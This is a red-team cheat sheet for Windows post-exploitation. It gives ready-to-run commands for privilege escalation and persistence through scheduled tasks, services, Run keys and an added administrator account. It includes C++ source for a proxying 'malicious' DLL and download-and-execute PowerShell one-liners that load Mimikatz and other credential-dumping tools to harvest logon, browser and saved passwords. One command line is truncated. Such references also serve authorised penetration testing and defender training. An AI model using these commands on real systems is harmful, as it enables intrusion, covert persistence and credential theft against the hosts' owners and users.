## Privilege Escalation

### PowerUp
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

### SharpUp
```
https://github.com/GhostPack/SharpUp
```

### Sherlock
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
Find-AllVulns
```

### Watson
```
https://github.com/rasta-mouse/Watson
```

## Persistence

### Create new task
```
schtasks /create /sc minute /mo 1 /tn "eviloo" /tr C:\shell.exe /ru "SYSTEM"
schtasks /create /sc onlogon /tn "task-name" /tr "File" /ru "username"
```

### Add User
```
net user testuser P@ssw0rd /add
net localgroup administrators testuser /add
```

### Create Service
```
sc create evilsvc binPath= "c:\Windows\System32\calc.exe" start= "auto"
```

### Registry Keys
```
REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v test /d "C:\shell.exe"
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run /v test /d "C:\shell.exe"
```

### StartUp Folder (Run(shell:startup))
```
C:\Users\Hassan.saad\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

### DLL Proxying

![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Screen2.png?raw=true)

Create legitimate.cpp file.

```
#include "pch.h"
​
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
​
extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
{
    MessageBoxA(NULL, "Hi from legitimate exportedFunction1", "Hi from legitimate exportedFunction1", 0);
}
​
extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
{
    MessageBoxA(NULL, "Hi from legitimate exportedFunction2", "Hi from legitimate exportedFunction2", 0);
}
​
extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
{
    MessageBoxA(NULL, "Hi from legitimate exportedFunction3", "Hi from legitimate exportedFunction3", 0);
}
```

```
# Compile
"c:\Program Files\CodeBlocks\MinGW\bin\g++.exe" -shared c:\legitimate.cpp -o c:\legitimate.dll
​
# Execute
rundll32 c:\legitimate.dll,exportedFunction1
```

Create malicious DLL to redirect the execution to the legitimate DLL.

```
#include "pch.h"
​
// Redirect the execution to the legitimate DLL
#pragma comment(linker, "/export:exportedFunction1=legitimate.exportedFunction1")
#pragma comment(linker, "/export:exportedFunction2=legitimate.exportedFunction2")
#pragma comment(linker, "/export:exportedFunction3=legitimate.exportedFunction3")
​
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Insert your malicious code here
        MessageBoxA(NULL, "Hi from malicious dll", "Hi from malicious dll", 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```
# Compile
"c:\Program Files\CodeBlocks\MinGW\bin\g++.exe" -shared c:\malicious.cpp -o c:\malicious.dll

# Execute
rundll32 c:\malicious.dll,exportedFunction1
```

Now when the call comes to malicious.dll it will forward this call to legitimate.dll

## Collecting Credentials

### Memory Credentials Dump
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/hassan0x/test/master/mim.ps1')
Invoke-Mimikatz -Command 'privilege::debug'
Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
```
![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Screen1.png?raw=true)

### Windows Credentials Manager
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1')
Invoke-WCMDump
```

### Web Credentials Manager
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1')
Get-WebCredentials
```

### Chrome Passwords
```
https://github.com/ohyicong/decrypt-chrome-passwords/raw/main/decrypt_chrome_password.exe
```

### Chrome History
```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1')
Get-ChromeDump > chromepwds.txt
```

### Other Saved Credentials
```
System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1')
Invoke-SessionGopher -Thorough
```
